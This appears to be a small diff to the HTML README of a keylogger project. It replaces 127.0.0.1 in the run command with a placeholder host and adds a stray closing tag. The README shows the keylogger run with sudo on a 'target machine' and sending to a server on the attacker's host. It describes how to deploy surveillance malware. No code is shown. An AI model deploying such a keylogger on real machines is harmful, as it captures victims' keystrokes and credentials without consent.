@@ -25,7 +25,7 @@ Synopsis:
   <li><b>host</b>: server hostname or ipv4 address</li>
   <li><b>port</b>: server port</li> 
 </ul>
-Running example (on target machine): <code>sudo ./keylogger 127.0.0.1 12345</code><br>
+Running example (on target machine): <code>sudo ./keylogger <server-ip></server-ip> 12345</code><br>
 Running example (on host machine): <code>./server</code>
 
 <H3 id="Finding"> Looking for keyboard device </H3>
